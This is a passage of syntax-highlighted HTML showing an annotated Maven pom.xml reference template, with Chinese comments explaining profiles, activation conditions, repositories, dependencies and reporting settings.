/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        ......</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--在列的项目构建profile，如果被激活，会修改构建处理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--根据环境参数或命令行参数激活某个构建处理 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构建配置的唯一标识符。即用于命令行激活，也用于在继承时合并具有相同标识符的profile。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--自动触发profile的条件逻辑。Activation是profile的开启钥匙。profile的力量来自于它 能够在某些特定的环境中自动使用某些特定的值；这些环境通过activation元素指定。activation元素并不是激活profile的唯一方式。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--profile默认是否激活的标志 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">activeByDefault</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--当匹配的jdk被检测到，profile被激活。例如，1.4激活JDK1.4，1.4.0_2，而!1.4激活所有版本不是以1.4开头的JDK。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jdk</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--当匹配的操作系统属性被检测到，profile被激活。os元素可以定义一些操作系统相关的属性。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">os</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统的名字 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Windows XP<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统所属家族(如 &#x27;windows&#x27;) --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">family</span>&gt;</span>Windows<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统体系结构 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">arch</span>&gt;</span>x86<span class="tag">&lt;/<span class="name">arch</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统版本 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.2600<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">os</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--如果Maven检测到某一个属性（其值可以在POM中通过$&#123;名称&#125;引用），其拥有对应的名称和值，Profile就会被激活。如果值 字段是空的，那么存在属性名称字段就会激活profile，否则按区分大小写方式匹配属性值字段 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的属性的名称 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mavenVersion<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的属性的值 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--提供一个文件名，通过检测该文件的存在或不存在来激活profile。missing检查文件是否存在，如果不存在则激活 profile。另一方面，exists则会检查文件是否存在，如果存在则激活profile。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--如果指定的文件存在，则激活profile。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">exists</span>&gt;</span>/usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">exists</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--如果指定的文件不存在，则激活profile。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">missing</span>&gt;</span>/usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">missing</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构建项目所需要的信息。参见build元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">defaultGoal</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">testResources</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">testResource</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">testResource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">testResources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">finalName</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filters</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--参见build/pluginManagement/plugins/plugin元素 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                                <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                                    ......</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--参见build/pluginManagement/plugins/plugin元素 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                                ......</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">modules</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--发现依赖和扩展的远程仓库列表。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--参见repositories/repository元素 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--发现插件的远程仓库列表，这些插件用于构建和报表 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--包含需要连接到远程插件仓库的信息.参见repositories/repository元素 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。要获取更多信息，请看项目依赖机制。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                    ......</span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--不赞成使用. 现在Maven忽略该元素. --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">reports</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--该元素包括使用报表插件产生报表的规范。当用户执行&quot;mvn site&quot;，这些报表就会运行。 在页面导航栏能看到所有报表的链接。参见reporting元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">reporting</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">reporting</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见dependencyManagement元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        ......</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见distributionManagement元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见properties元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发现依赖和扩展的远程仓库列表。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包含需要连接到远程仓库的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--如何处理远程仓库里发布版本的下载 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--true或者false表示该仓库是否为下载某种类型构件（发布版，快照版）开启。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--该元素指定更新发生的频率。Maven会比较本地POM和远程POM的时间戳。这里的选项是：always（一直），daily（默认，每日），interval：X（这里X是以分钟为单位的时间间隔），或者never（从不）。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--当Maven验证构件校验文件失败时该怎么做：ignore（忽略），fail（失败），或者warn（警告）。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 如何处理远程仓库里快照版本的下载。有了releases和snapshots这两组配置，POM就可以在每个单独的仓库中，为每种类型的构件采取不同的 </span></span><br><span class="line"><span class="comment">                策略。例如，可能有人会决定只为开发目的开启对快照版本下载的支持。参见repositories/repository/releases元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--远程仓库唯一标识符。可以用来匹配在settings.xml文件里配置的远程仓库 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-repository-proxy<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--远程仓库名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon-repository-proxy<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--远程仓库URL，按protocol://hostname/path形式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.1.169:9999/repository/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 用于定位和排序构件的仓库布局类型-可以是default（默认）或者legacy（遗留）。Maven 2为其仓库提供了一个默认的布局；然 </span></span><br><span class="line"><span class="comment">                而，Maven 1.x有一种不同的布局。我们可以使用该元素指定布局是default（默认）还是legacy（遗留）。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span>&gt;</span>default<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发现插件的远程仓库列表，这些插件用于构建和报表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包含需要连接到远程插件仓库的信息.参见repositories/repository元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            ......</span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。要获取更多信息，请看项目依赖机制。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖的group ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖的artifact ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-artifact<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖的版本号。 在Maven 2里, 也可以配置成版本号的范围。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 依赖类型，默认类型是jar。它通常表示依赖的文件的扩展名，但也有例外。一个类型可以被映射成另外一个扩展名或分类器。类型经常和使用的打包方式对应， </span></span><br><span class="line"><span class="comment">                尽管这也有例外。一些类型的例子：jar，war，ejb-client和test-jar。如果设置extensions为 true，就可以在 plugin里定义新的类型。所以前面的类型的例子不完整。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 依赖的分类器。分类器可以区分属于同一个POM，但不同构建方式的构件。分类器名被附加到文件名的版本号后面。例如，如果你想要构建两个单独的构件成 </span></span><br><span class="line"><span class="comment">                JAR，一个使用Java 1.4编译器，另一个使用Java 6编译器，你就可以使用分类器来生成两个单独的JAR构件。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">classifier</span>&gt;</span><span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖范围。在项目发布过程中，帮助决定哪些构件被包括进来。欲知详情请参考依赖机制。 - compile ：默认范围，用于编译 - provided：类似于编译，但支持你期待jdk或者容器提供，类似于classpath </span></span><br><span class="line"><span class="comment">                - runtime: 在执行时需要使用 - test: 用于test任务时使用 - system: 需要外在提供相应的元素。通过systemPath来取得 </span></span><br><span class="line"><span class="comment">                - systemPath: 仅用于范围为system。提供相应的路径 - optional: 当项目自身被依赖时，标注依赖是否传递。用于连续依赖时使用 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--仅供system范围使用。注意，不鼓励使用这个元素，并且在新的版本中该元素可能被覆盖掉。该元素为依赖规定了文件系统上的路径。需要绝对路径而不是相对路径。推荐使用属性匹配绝对路径，例如$&#123;java.home&#125;。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span><span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--当计算传递依赖时， 从依赖构件列表里，列出被排除的依赖构件集。即告诉maven你只依赖指定的项目，不依赖项目的依赖。此元素主要用于解决版本冲突问题 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--可选依赖，如果你在项目B中把C依赖声明为可选，你就需要在依赖于B的项目（例如项目A）中显式的引用对C的依赖。可选依赖阻断依赖的传递性。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不赞成使用. 现在Maven忽略该元素. --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">reports</span>&gt;</span><span class="tag">&lt;/<span class="name">reports</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--该元素描述使用报表插件产生报表的规范。当用户执行&quot;mvn site&quot;，这些报表就会运行。 在页面导航栏能看到所有报表的链接。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">reporting</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--true，则，网站不包括默认的报表。这包括&quot;项目信息&quot;菜单中的报表。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">excludeDefaults</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--所有产生的报表存放到哪里。默认值是$&#123;project.build.directory&#125;/site。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outputDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--使用的报表插件和他们的配置。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--plugin元素包含描述报表插件需要的信息 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--报表插件在仓库里的group ID --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                <span 